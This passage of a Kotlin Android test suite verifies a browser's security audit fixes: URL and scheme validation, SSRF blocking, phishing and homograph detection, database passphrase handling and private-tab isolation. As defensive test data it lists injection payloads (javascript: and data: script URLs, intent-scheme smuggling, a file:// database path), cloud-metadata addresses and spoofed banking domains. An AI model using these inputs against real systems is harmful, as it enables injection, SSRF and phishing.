        assertFalse("Sanitized filename must not contain path traversal", traversalSanitized.contains("/") || traversalSanitized.contains(".."))
        val rloSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("statement_\u202Efdp.apk")
        assertFalse("Unicode RLO spoofing character must be stripped", rloSanitized.contains('\u202E'))

        // 3. DevTools & Bridge Payload Bounds + Threat Inspection Gate (Tahap 3)
        val threatResult = secGuard.inspectUrlThreat(
            url = "https://secure-login-verify.xyz/auth",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertNotEquals("Phishing URL must not be classified as SAFE", com.example.manager.ThreatSeverity.SAFE, threatResult.severity)

        // 4. Encrypted Preferences, Private Tab Isolation, & Incognito Download Isolation Gate (Tahap 4 & Tahap 5)
        val settings = com.example.manager.SettingsManager(context)
        settings.saveTabs(
            listOf(
                com.example.ui.viewmodel.BrowserTab(id = "norm_t8", url = "https://example.com", title = "Example", isPrivate = false),
                com.example.ui.viewmodel.BrowserTab(id = "priv_t8", url = "https://secret.example", title = "Secret", isPrivate = true)
            ),
            activeTabId = "priv_t8"
        )
        val restoredTabs = settings.loadTabs()
        assertNotNull(restoredTabs)
        assertEquals("Incognito tabs must never be persisted to disk", 1, restoredTabs!!.size)
        assertFalse(restoredTabs[0].isPrivate)
        assertEquals("norm_t8", restoredTabs[0].id)

        // 5. Permission Isolation, W3C Secure Context, & Ephemeral Host Bypass Reset Gate (Tahap 5 & Tahap 7)
        val permMgr = com.example.manager.PermissionManager(context)
        permMgr.setWebsitePermission(
            "https://media.example.com",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            com.example.manager.PermissionState.ALLOW,
            permMgr.getWebsitePermission("https://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertEquals(
            "HTTP origin on same host must not inherit HTTPS permission",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        secGuard.allowHostTemporarily(context, "ephemeral-bypass-t8.example.com", persist = false)
        assertTrue(secGuard.isHostUserTrusted(context, "ephemeral-bypass-t8.example.com"))

        // Verify namespace isolation when clearing permissions & temporary bypasses
        val encPrefs = com.example.manager.EncryptedPreferencesManager.getPreferences(context)
        encPrefs.edit().putString("audit_sentinel_key_t8", "intact_value").commit()
        permMgr.clearAllPermissions()
        secGuard.clearTemporaryBypasses()

        assertEquals(
            "Site permission must reset to ASK after clearAllPermissions()",
            com.example.manager.PermissionState.ASK,
            permMgr.getWebsitePermission("https://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertFalse(
            "Temporary host bypass must be cleared after clearTemporaryBypasses()",
            secGuard.isHostUserTrusted(context, "ephemeral-bypass-t8.example.com")
        )
        assertEquals(
            "Global encrypted preference outside permission namespace must survive permission clear",
            "intact_value",
            encPrefs.getString("audit_sentinel_key_t8", "")
        )

        // 6. AdBlock, Tracker Blocking, Cosmetic Sanitizer, WebRTC, & Extension Security Gate (Tahap 6 & Tahap 7)
        val webView = WebView(context)
        val adBlockClient = AdBlockWebViewClient(PrivacyMode.BALANCED)
        adBlockClient.updateCurrentPageUrl("https://news.example.com")
        assertNotNull(
            "Known ad/tracker script must be intercepted in BALANCED mode",
            adBlockClient.shouldInterceptRequest(webView, createRequest("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"))
        )
        assertFalse(
            "Malicious CSS selector attempting block breakout must be rejected",
            com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-slot { background: url(javascript:alert(1)) }")
        )

        val strictWebRtcJs = secGuard.buildWebRtcProtectionScript(preventWebRtcLeak = true, strictWebRtcMode = true)
        assertTrue(strictWebRtcJs.contains("RTCPeerConnection") && strictWebRtcJs.contains("webkitRTCPeerConnection"))

        val autoExt = com.example.manager.BrowserExtension(
            id = "ext_t8",
            name = "T8 Auto Ext",
            jsCode = "console.log('t8');",
            matches = listOf("*"),
            isEnabled = true
        )
        assertFalse(
            "Auto extension injection must be blocked on critical banking/auth domains",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://accounts.google.com/ServiceLogin")
        )
    }

    @Test
    fun testFase1AuditFixesVerification() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val secGuard = com.example.manager.SecurityGuardEngine
        val dlMgr = com.example.manager.AppDownloadManager
        val extMgr = com.example.manager.BrowserExtensionManager
        val searchMgr = com.example.manager.SearchEngineManager

        // =========================================================================
        // F1-01: Hostname validation must NOT block public fc*/fd* domains as IPv6
        // =========================================================================
        // 1. Download path: public domains starting with fc / fd must be allowed
        assertTrue(
            "F1-01: fdroid.org must not be rejected as IPv6 ULA in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("https://fdroid.org/F-Droid.apk", resolveDns = false)
        )
        assertTrue(
            "F1-01: fda.gov must not be rejected as IPv6 ULA in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("https://www.fda.gov/media/report.pdf", resolveDns = false)
        )
        assertTrue(
            "F1-01: fcc.gov must not be rejected as IPv6 ULA in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("https://fcc.gov/document.pdf", resolveDns = false)
        )
        // 2. Download path: actual IPv6 ULA & local addresses and IPv4 private/loopback/link-local must remain blocked
        assertFalse(
            "F1-01: IPv6 ULA fc00::1 must be blocked in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("http://[fc00::1]/internal.bin", resolveDns = false)
        )
        assertFalse(
            "F1-01: IPv6 ULA fd00::1 must be blocked in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("https://[fd00::1]/internal.bin", resolveDns = false)
        )
        assertFalse(
            "F1-01: 127.0.0.1 must remain blocked in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("http://127.0.0.1/secret", resolveDns = false)
        )
        assertFalse(
            "F1-01: 10.0.0.1 must remain blocked in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("http://10.0.0.1/secret", resolveDns = false)
        )
        assertFalse(
            "F1-01: 169.254.169.254 must remain blocked in AppDownloadManager",
            dlMgr.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/", resolveDns = false)
        )

        // 3. Extension import path: public domains starting with fc / fd must be allowed
        assertTrue(
            "F1-01: fdroid.org must not be rejected as IPv6 ULA in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://fdroid.org/repo/script.user.js", resolveDns = false)
        )
        assertTrue(
            "F1-01: fda.gov must not be rejected as IPv6 ULA in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://fda.gov/ext/helper.user.js", resolveDns = false)
        )
        assertTrue(
            "F1-01: fcc.gov must not be rejected as IPv6 ULA in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://fcc.gov/ext/helper.user.js", resolveDns = false)
        )
        // 4. Extension import path: actual IPv6 ULA & IPv4 private/loopback/link-local must remain blocked
        assertFalse(
            "F1-01: IPv6 ULA fc00::1 must be blocked in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://[fc00::1]/evil.user.js", resolveDns = false)
        )
        assertFalse(
            "F1-01: IPv6 ULA fd00::1 must be blocked in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://[fd00::1]/evil.user.js", resolveDns = false)
        )
        assertFalse(
            "F1-01: 127.0.0.1 must remain blocked in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://127.0.0.1/evil.user.js", resolveDns = false)
        )
        assertFalse(
            "F1-01: 10.0.0.1 must remain blocked in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://10.0.0.1/evil.user.js", resolveDns = false)
        )
        assertFalse(
            "F1-01: 169.254.169.254 must remain blocked in BrowserExtensionManager",
            extMgr.isSafeRemoteExtensionUrl("https://169.254.169.254/latest/meta-data/", resolveDns = false)
        )

        // =========================================================================
        // F1-02: External scheme validation (denylist + RFC 3986 validation)
        // =========================================================================
        val validPaymentLinks = listOf(
            "gopay://pay?order_id=INV-001",
            "ovo://payment?amount=50000",
            "dana://qr/pay",
            "shopeepay://open",
            "linkaja://transfer",
            "bca://transfer",
            "intent://pay#Intent;scheme=gopay;package=com.gojek.app;end"
        )
        for (deepLink in validPaymentLinks) {
            assertTrue(
                "F1-02: Valid payment deep link '$deepLink' must pass external scheme check to reach confirmation dialog",
                secGuard.isAllowedExternalScheme(deepLink)
            )
            val safeIntent = secGuard.buildSafeExternalIntent(context, deepLink)
            assertNotNull("F1-02: Valid payment deep link '$deepLink' must build a sanitized Intent", safeIntent)
            assertEquals(android.content.Intent.ACTION_VIEW, safeIntent!!.action)
            assertNull("F1-02: Component must always be null", safeIntent.component)
            assertNull("F1-02: Selector must always be null", safeIntent.selector)
            assertEquals(
                "F1-02: Grant flags must be stripped",
                0,
                safeIntent.flags and (
                    android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION or
                        android.content.Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                        android.content.Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                        android.content.Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                    )
            )
        }

        val blockedExternalSchemes = listOf(
            "javascript:alert(1)",
            "vbscript:msgbox(1)",
            "file:///data/data/com.example/databases/alex_browser_database",
            "content://${context.packageName}.fileprovider/downloads/a.pdf",
            "data:text/html,<script>alert(1)</script>",
            "blob:https://example.com/550e8400-e29b-41d4-a716-446655440000",
            "chrome://settings",
            "about:config",
            "intent:///secret#Intent;scheme=file;end",
            "intent://xss#Intent;scheme=javascript;end",
            "intent://leak#Intent;scheme=content;end"
        )
        for (dangerous in blockedExternalSchemes) {
            assertFalse(
                "F1-02: Dangerous scheme '$dangerous' must never be allowed as external scheme",
                secGuard.isAllowedExternalScheme(dangerous)
            )
            assertNull(
                "F1-02: Dangerous scheme '$dangerous' must return null from buildSafeExternalIntent",
                secGuard.buildSafeExternalIntent(context, dangerous)
            )
        }

        // Normal HTTP/HTTPS URLs work as web navigation and are not external schemes
        assertTrue(secGuard.isSafeWebNavigationUrl("https://www.tokopedia.com"))
        assertTrue(secGuard.isSafeWebNavigationUrl("http://example.com"))
        assertFalse(secGuard.isAllowedExternalScheme("https://www.tokopedia.com"))
        assertFalse(secGuard.isAllowedExternalScheme("http://example.com"))

        // =========================================================================
        // F1-03: Official domain dot-boundary check, IPv4 prefix check, and Punycode
        // =========================================================================
        // 1. Exact official domains & valid official subdomains -> SAFE
        assertEquals(
            com.example.manager.ThreatSeverity.SAFE,
            secGuard.inspectUrlThreat("https://bca.co.id/id/individu", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )
        assertEquals(
            com.example.manager.ThreatSeverity.SAFE,
            secGuard.inspectUrlThreat("https://ibank.bca.co.id/login", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )
        assertEquals(
            com.example.manager.ThreatSeverity.SAFE,
            secGuard.inspectUrlThreat("https://paypal.com/myaccount", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )
        assertEquals(
            com.example.manager.ThreatSeverity.SAFE,
            secGuard.inspectUrlThreat("https://www.paypal.com/signin", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )

        // 2. Spoofed hostnames appended to official domain without dot separator -> SUSPICIOUS_PHISHING
        val spoofedNoBoundaryUrls = listOf(
            "https://klikbca-evilbca.co.id/login",
            "https://mybca-fakebca.co.id/auth",
            "https://paypalsecure-evilpaypal.com/signin",
            "https://brimo-fakebri.co.id/verify"
        )
        for (spoofUrl in spoofedNoBoundaryUrls) {
            val threat = secGuard.inspectUrlThreat(spoofUrl, httpsOnlyEnabled = true, phishingProtectionEnabled = true)
            assertEquals(
                "F1-03: Spoofed domain without dot boundary '$spoofUrl' must be detected as SUSPICIOUS_PHISHING",
                com.example.manager.ThreatSeverity.SUSPICIOUS_PHISHING,
                threat.severity
            )
        }

        // 3. Public domains starting with 10. or 100. must NOT be misclassified as private IPs
        assertFalse(
            "F1-03: 100.example.com must not be classified as local/private IP",
            secGuard.isLocalOrPrivateAddress("100.example.com")
        )
        assertFalse(
            "F1-03: 10.example.com must not be classified as local/private IP",
            secGuard.isLocalOrPrivateAddress("10.example.com")
        )
        assertFalse(
            "F1-03: 172.16.example.com must not be classified as local/private IP",
            secGuard.isLocalOrPrivateAddress("172.16.example.com")
        )
        assertEquals(
            "F1-03: Plain HTTP to 10.example.com must trigger HTTP_INSECURE under HTTPS-Only mode",
            com.example.manager.ThreatSeverity.HTTP_INSECURE,
            secGuard.inspectUrlThreat("http://10.example.com/login", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )

        // 4. Private IP literals must still be classified as local/private
        assertTrue(secGuard.isLocalOrPrivateAddress("10.0.0.1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("127.0.0.1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("192.168.1.1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("172.16.0.1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("169.254.169.254"))
        assertTrue(secGuard.isLocalOrPrivateAddress("100.64.0.1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("fc00::1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("fd00::1"))
        assertTrue(secGuard.isLocalOrPrivateAddress("::1"))

        // 5. Punycode: benign internationalized domains must NOT be auto-blocked, while homograph spoofs MUST be blocked
        assertEquals(
            "F1-03: Legitimate non-spoofing German IDN domain xn--mnchen-3ya.de must not be auto-blocked",
            com.example.manager.ThreatSeverity.SAFE,
            secGuard.inspectUrlThreat("https://xn--mnchen-3ya.de/info", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )
        assertEquals(
            "F1-03: Mixed-script Cyrillic/Latin homograph xn--pple-43d.com (аpple.com) must be blocked",
            com.example.manager.ThreatSeverity.SUSPICIOUS_PHISHING,
            secGuard.inspectUrlThreat("https://xn--pple-43d.com/login", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )
        assertEquals(
            "F1-03: Pure Cyrillic brand homograph xn--80ak6aa92e.com (apple.com spoof) must be blocked",
            com.example.manager.ThreatSeverity.SUSPICIOUS_PHISHING,
            secGuard.inspectUrlThreat("https://xn--80ak6aa92e.com/", httpsOnlyEnabled = true, phishingProtectionEnabled = true).severity
        )

        // =========================================================================
        // F1-04: Scoped blob: verification for active HTTPS origin vs direct navigation block
        // =========================================================================
        val sampleBlobUrl = "blob:https://docs.example.com/550e8400-e29b-41d4-a716-446655440000"
        assertFalse(
            "F1-04: blob: URL must never pass direct web navigation gate",
            secGuard.isSafeWebNavigationUrl(sampleBlobUrl)
        )
        val blobAddressBarResult = searchMgr.parseUrlOrQuery(sampleBlobUrl, com.example.manager.SearchEngine.GOOGLE)
        assertTrue(
            "F1-04: blob: URL typed in address bar must be converted to search query, never raw navigation",
            blobAddressBarResult.startsWith("https://www.google.com/search?q=")
        )
        assertTrue(
            "F1-04: blob: URL matching active HTTPS page origin must be allowed for preview/download",
            secGuard.isSafeBlobUrlForContext(sampleBlobUrl, "https://docs.example.com/editor/view")
        )
        assertFalse(
            "F1-04: blob: URL with mismatched active page origin must be rejected",
            secGuard.isSafeBlobUrlForContext(sampleBlobUrl, "https://attacker.example.org/page")
        )
        assertFalse(
            "F1-04: blob: URL with unverified/blank active page context must be rejected",
            secGuard.isSafeBlobUrlForContext(sampleBlobUrl, null)
        )
        assertFalse(
            "F1-04: blob: URL from insecure HTTP origin must be rejected",
            secGuard.isSafeBlobUrlForContext("blob:http://docs.example.com/1234", "http://docs.example.com/page")
        )
        assertFalse(
            "F1-04: blob: URL pointing to private/loopback host must be rejected",
            secGuard.isSafeBlobUrlForContext("blob:https://127.0.0.1/1234", "https://127.0.0.1/page")
        )
        assertFalse(
            "F1-04: javascript: scheme disguised in blob check must be rejected",
            secGuard.isSafeBlobUrlForContext("javascript:alert(1)", "https://docs.example.com/editor")
        )

        // =========================================================================
        // F1-05: SQLCipher passphrase protection, transactional migration, and status reporting
        // =========================================================================
        val prefs = com.example.manager.EncryptedPreferencesManager.getPreferences(context)
        prefs.edit().remove(com.example.data.AppDatabaseEncrypted.KEY_DB_PASSPHRASE).commit()

        // 1. When encrypted DB file already exists on disk and passphrase is missing, it MUST throw DatabaseKeyUnavailableException
        // and MUST NOT generate/overwrite a new passphrase!
        var threwKeyUnavailable = false
        try {
            com.example.data.AppDatabaseEncrypted.getDatabasePassphrase(
                context = context,
                encryptedDbExistsOverride = true
            )
        } catch (_: com.example.data.DatabaseKeyUnavailableException) {
            threwKeyUnavailable = true
        }
        assertTrue(
            "F1-05: Missing passphrase when encrypted DB exists must throw DatabaseKeyUnavailableException",
            threwKeyUnavailable
        )
        assertNull(
            "F1-05: Key slot must NOT be overwritten with a new passphrase when encrypted DB already exists",
            prefs.getString(com.example.data.AppDatabaseEncrypted.KEY_DB_PASSPHRASE, null)
        )

        // 2. When no encrypted DB file exists yet, passphrase is created and persisted
        val createdPassphrase = com.example.data.AppDatabaseEncrypted.getDatabasePassphrase(
            context = context,
            encryptedDbExistsOverride = false
        )
        assertTrue("F1-05: Passphrase must be generated for fresh DB", createdPassphrase.isNotBlank())
        assertEquals(
            "F1-05: Subsequent calls must return the exact same persisted passphrase even when encrypted DB now exists",
            createdPassphrase,
            com.example.data.AppDatabaseEncrypted.getDatabasePassphrase(
                context = context,
                encryptedDbExistsOverride = true
            )
        )

        // 3. Transactional migration between source and target Room databases preserves history, bookmarks,
        // and non-incognito downloads while excluding incognito downloads
        context.deleteDatabase("test_f105_source.db")
        context.deleteDatabase("test_f105_target.db")
        val sourceDb = androidx.room.Room.databaseBuilder(
            context,
            com.example.data.AppDatabase::class.java,
            "test_f105_source.db"
        ).allowMainThreadQueries().build()
        val targetDb = androidx.room.Room.databaseBuilder(
            context,
            com.example.data.AppDatabase::class.java,
            "test_f105_target.db"
        ).allowMainThreadQueries().build()

        try {
            val sSql = sourceDb.openHelper.writableDatabase
            val tSql = targetDb.openHelper.writableDatabase
            sSql.execSQL("INSERT INTO history (id, title, url, timestamp) VALUES (1, 'F-Droid', 'https://fdroid.org', 1000)")
            sSql.execSQL("INSERT INTO bookmarks (id, title, url, timestamp) VALUES (1, 'BCA', 'https://bca.co.id', 2000)")
            sSql.execSQL(
                "INSERT INTO downloads (id, fileName, url, domain, mimeType, totalBytes, downloadedBytes, status, fileUri, createdAt, completedAt, failureReason, isIncognito) " +
                    "VALUES ('dl_norm', 'app.apk', 'https://fdroid.org/app.apk', 'fdroid.org', 'application/vnd.android.package-archive', 1024, 1024, 'COMPLETED', '/tmp/app.apk', 3000, 3001, '', 0)"
            )
            sSql.execSQL(
                "INSERT INTO downloads (id, fileName, url, domain, mimeType, totalBytes, downloadedBytes, status, fileUri, createdAt, completedAt, failureReason, isIncognito) " +
                    "VALUES ('dl_incog', 'secret.pdf', 'https://example.com/secret.pdf', 'example.com', 'application/pdf', 512, 512, 'COMPLETED', '/tmp/secret.pdf', 3002, 3003, '', 1)"
            )

            val migrated = com.example.data.AppDatabase.migrateDatabaseContentsTransactionally(sSql, tSql)
            assertTrue("F1-05: Transactional database migration must succeed", migrated)

            tSql.query("SELECT COUNT(*) FROM history WHERE url = 'https://fdroid.org'").use { c ->
                assertTrue(c.moveToFirst())
                assertEquals(1, c.getInt(0))
            }
            tSql.query("SELECT COUNT(*) FROM bookmarks WHERE url = 'https://bca.co.id'").use { c ->
                assertTrue(c.moveToFirst())
                assertEquals(1, c.getInt(0))
            }
            tSql.query("SELECT COUNT(*) FROM downloads WHERE id = 'dl_norm'").use { c ->
                assertTrue(c.moveToFirst())
                assertEquals(1, c.getInt(0))
            }
            tSql.query("SELECT COUNT(*) FROM downloads WHERE id = 'dl_incog'").use { c ->
                assertTrue(c.moveToFirst())
                assertEquals("F1-05: Incognito downloads must not be migrated to persistent DB", 0, c.getInt(0))
            }
        } finally {
            sourceDb.close()
            targetDb.close()
            context.deleteDatabase("test_f105_source.db")
            context.deleteDatabase("test_f105_target.db")
        }

        // 4. Verify encryption status reporting is honest in unit-test fallback mode
        val dbInstance = com.example.data.AppDatabase.getDatabase(context)
        assertNotNull(dbInstance)
        val currentStatus = com.example.data.AppDatabase.getEncryptionStatus()
        assertEquals(
            "F1-05: Robolectric fallback database must honestly report DEGRADED_RECOVERY_IN_MEMORY, not claim SQLCipher encryption",
            com.example.data.DatabaseEncryptionStatus.DEGRADED_RECOVERY_IN_MEMORY,
            currentStatus
        )
        assertFalse(currentStatus.isEncrypted)
    }

    @Test
    fun testFase2AuditFixesVerification() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val settings = com.example.manager.SettingsManager(context)
        val secGuard = com.example.manager.SecurityGuardEngine

        // ── F2-01: Private tab DOM storage isolation & SecuritySnapshot reporting ──
        val incognitoStorageScript = secGuard.buildIncognitoStorageIsolationScript()
        assertTrue(
            "F2-01: Incognito storage isolation script must install in-memory localStorage & sessionStorage polyfill",
            incognitoStorageScript.contains("__asIncognitoStorageIsolated") &&
                incognitoStorageScript.contains("createMemoryStorage") &&
                incognitoStorageScript.contains("localStorage") &&
                incognitoStorageScript.contains("sessionStorage")
        )

        val vm = com.example.ui.viewmodel.BrowserViewModel(context as android.app.Application)
        vm.refreshSecuritySnapshot("tab_regular", "https://example.com", isPrivate = false)
        vm.refreshSecuritySnapshot("tab_private", "https://example.com", isPrivate = true)
        val regularSnap = vm.devToolsStates.value["tab_regular"]?.securitySnapshot
        val privateSnap = vm.devToolsStates.value["tab_private"]?.securitySnapshot
        assertNotNull(regularSnap)
        assertNotNull(privateSnap)
        assertTrue("F2-01: Regular tab must have domStorageEnabled = true", regularSnap!!.domStorageEnabled)
        assertFalse("F2-01: Private tab must have domStorageEnabled = false to prevent persistent disk writes", privateSnap!!.domStorageEnabled)
        assertFalse("F2-01: Private tab must block third-party cookies", privateSnap.thirdPartyCookiesAllowed)

        // Verify private URLs are never persisted to SharedPreferences
        vm.addNewTab("https://regular-site.example/home", isPrivate = false)
        val regTabId = vm.activeTabId.value
        vm.addNewTab("https://secret-private.example/vault", isPrivate = true)
        val privTabId = vm.activeTabId.value
        val persistedTabs = settings.loadTabs().orEmpty()
        assertTrue(
            "F2-01: Regular tab must be persisted",
            persistedTabs.any { it.url == "https://regular-site.example/home" }
        )
        assertFalse(
            "F2-01: Private tab URL must never be saved to SharedPreferences",
            persistedTabs.any { it.url.contains("secret-private.example") }
        )

        // Closing private tab while regular tab is open must preserve regular tab
        vm.removeTab(privTabId)
        assertTrue(
            "F2-01: Regular tab must remain intact when private tab is closed",
            vm.tabs.value.any { it.id == regTabId && it.url == "https://regular-site.example/home" }
        )

        // ── F2-02: clearCookiesOnExit default false & TabPersistenceService preserves tabs when false ──
        settings.clearCookiesOnExit = false
        assertFalse("F2-02: clearCookiesOnExit must default to / remain false", settings.clearCookiesOnExit)
        settings.saveTabs(
            listOf(com.example.ui.viewmodel.BrowserTab(id = "t1", url = "https://saved-tab.example", title = "Saved", isPrivate = false)),
            activeTabId = "t1"
        )
        val service = org.robolectric.Robolectric.buildService(com.example.manager.TabPersistenceService::class.java).create().get()
        service.onTaskRemoved(android.content.Intent())
        assertEquals(
            "F2-02: Swiping app from Recents must NOT wipe persisted regular tabs when clearCookiesOnExit is false",
            1,
            settings.loadTabs().orEmpty().size
        )

        // When clearCookiesOnExit is true, onTaskRemoved clears persisted tabs as requested
        settings.clearCookiesOnExit = true
        service.onTaskRemoved(android.content.Intent())
        assertEquals(
            "F2-02: Swiping app from Recents must clear persisted tabs when clearCookiesOnExit is explicitly true",
            0,
            settings.loadTabs().orEmpty().size
        )
        settings.clearCookiesOnExit = false

        // ── F2-03: Separation of Clear Cache Only, Clear Cookies & Site Data, and Clear History ──
        val tabsBeforeClear = vm.tabs.value.size
        assertTrue("F2-03: Must have open regular tab before cache/cookie clear", tabsBeforeClear >= 1)
        vm.clearBrowserCacheOnly(context)
        assertEquals(
            "F2-03: clearBrowserCacheOnly must NOT close or reset open tabs",
            tabsBeforeClear,
            vm.tabs.value.size
        )
        vm.clearCacheAndCookies(context, closeTabs = false)
        assertEquals(
            "F2-03: clearCacheAndCookies(closeTabs=false) must NOT close open regular tabs",
            tabsBeforeClear,
            vm.tabs.value.size
        )

        // ── F2-04 & F2-05: Strict domain boundary for AFP bypass (no substring bypass) ──
        assertTrue("F2-05: Official google.com must be recognized as AFP bypass domain", secGuard.isAfpBypassDomain("google.com"))
        assertTrue("F2-05: Subdomain meet.google.com must be recognized as AFP bypass domain", secGuard.isAfpBypassDomain("meet.google.com"))
        assertTrue("F2-05: Official discord.com must be recognized as AFP bypass domain", secGuard.isAfpBypassDomain("discord.com"))
        assertTrue("F2-05: Official zoom.us must be recognized as AFP bypass domain", secGuard.isAfpBypassDomain(" us02web.zoom.us "))
        assertFalse(
            "F2-05: Attacker domain containing 'google' substring must NOT bypass anti-fingerprinting",
            secGuard.isAfpBypassDomain("evil-google-tracker.com")
        )
        assertFalse(
            "F2-05: Attacker domain containing 'discord' substring must NOT bypass anti-fingerprinting",
            secGuard.isAfpBypassDomain("discord-logger.xyz")
        )
        assertFalse(
            "F2-05: Attacker domain containing 'meet' or 'zoom' substring must NOT bypass anti-fingerprinting",
            secGuard.isAfpBypassDomain("zoom-analytics-meet.net")
        )

        val standardAfpScript = secGuard.buildAntiFingerprintingScript(isDesktopMode = false, isStrictMode = false)
        assertTrue(
            "F2-05: Standard AFP script must spoof hardwareConcurrency & deviceMemory",
            standardAfpScript.contains("hardwareConcurrency") &&
                standardAfpScript.contains("deviceMemory") &&
                !standardAfpScript.contains("__asStrictAfpInstalled")
        )
        val strictAfpScript = secGuard.buildAntiFingerprintingScript(isDesktopMode = true, isStrictMode = true)
        assertTrue(
            "F2-05: Strict AFP script must include deterministic Canvas & AudioContext protection",
            strictAfpScript.contains("__asStrictAfpInstalled") &&
                strictAfpScript.contains("getImageData") &&
                strictAfpScript.contains("Linux x86_64")
        )

        // ── F2-06: FilterListManager & extension/download URL validation ──
        assertTrue(
            "F2-06: Official HTTPS filter list URL must be accepted",
            com.example.manager.FilterListManager.isSafeFilterListUrl("https://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "F2-06: HTTP filter list URL must be rejected",
            com.example.manager.FilterListManager.isSafeFilterListUrl("http://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "F2-06: Private IP filter list URL must be rejected",
            com.example.manager.FilterListManager.isSafeFilterListUrl("https://192.168.1.1/easylist.txt", resolveDns = false)
        )
    }

    @Test
    fun testFase3AuditFixesVerification() {
        val app = ApplicationProvider.getApplicationContext<android.app.Application>()
        val extMgr = com.example.manager.BrowserExtensionManager
        val vm = com.example.ui.viewmodel.BrowserViewModel(app)

        // ── F3-01: External Extension Import Safety, Domain Scope, & Private Tab Isolation ──
        val importedWildcardJs = extMgr.parseExtensionFromRawText(
            rawText = "console.log('external script without header');",
            fileName = "external_test.js",
            sourceType = com.example.manager.ExtensionSourceType.EXTERNAL_FILE,
            sourceUrl = ""
        )
        assertEquals("F3-01: External JS file must parse into 1 extension", 1, importedWildcardJs.size)
        val extItem = importedWildcardJs.first()
        assertFalse(
            "F3-01: Newly imported external extension with wildcard (*) scope must default to isEnabled = false until user enables",
            extItem.isEnabled
        )
        assertFalse(
            "F3-01: Newly imported external extension must default to allowInPrivate = false",
            extItem.allowInPrivate
        )

        // Verify broken/empty @match patterns do not expand into wildcard "*"
        assertEquals(
            "F3-01: Broken pattern without host must NOT expand to wildcard '*'",
            "",
            extMgr.normalizeMatchPattern("https:///path/only")
        )
        assertEquals(
            "F3-01: Explicit <all_urls> pattern must normalize to '*'",
            "*",
            extMgr.normalizeMatchPattern("<all_urls>")
        )
        assertEquals(
            "F3-01: Subdomain wildcard pattern must normalize to clean domain",
            "example.com",
            extMgr.normalizeMatchPattern("https://*.example.com/*")
        )

        // Verify private tab isolation for extensions & custom toolbar scripts
        val enabledExternalExt = extItem.copy(
            isEnabled = true,
            allowInPrivate = false,
            matches = listOf("example.com"),
            runAt = com.example.manager.ExtensionRunAt.DOCUMENT_END
        )
        assertTrue(
            "F3-01: Enabled extension must auto-inject on matching regular tab",
            extMgr.canAutoInjectExtensionOnUrl(enabledExternalExt, "https://sub.example.com/page", isPrivate = false)
        )
        assertFalse(
            "F3-01: Extension must NOT match attacker domain with suffix spoofing (evil-example.com)",
            extMgr.canAutoInjectExtensionOnUrl(enabledExternalExt, "https://evil-example.com/page", isPrivate = false)
        )
        assertFalse(
            "F3-01: Extension with allowInPrivate=false must NOT auto-inject in private/incognito tab",
            extMgr.canAutoInjectExtensionOnUrl(enabledExternalExt, "https://sub.example.com/page", isPrivate = true)
        )
        val explicitlyAllowedPrivateExt = enabledExternalExt.copy(allowInPrivate = true)
        assertTrue(
            "F3-01: Extension with allowInPrivate=true may auto-inject on non-critical matching site in private tab",
            extMgr.canAutoInjectExtensionOnUrl(explicitlyAllowedPrivateExt, "https://sub.example.com/page", isPrivate = true)
        )
        assertFalse(
            "F3-01: External extension must never match local/private IP addresses",
            extMgr.doesExtensionMatchUrl(
                enabledExternalExt.copy(matches = listOf("*")),
                "http://192.168.1.1/admin"
            )
        )

        // ── F3-02: GM_xmlhttpRequest SSRF, Scope Validation, & Credential Stripping ──
        val gmShim = extMgr.buildSafeGmXhrShim(listOf("api.example.com"))
        assertTrue(
            "F3-02: GM_xmlhttpRequest shim must enforce credentials: 'omit'",
            gmShim.contains("credentials: 'omit'")
        )
        assertTrue(
            "F3-02: GM_xmlhttpRequest shim must enforce redirect: 'error' and cache: 'no-store'",
            gmShim.contains("redirect: 'error'") && gmShim.contains("cache: 'no-store'")
        )
        assertTrue(
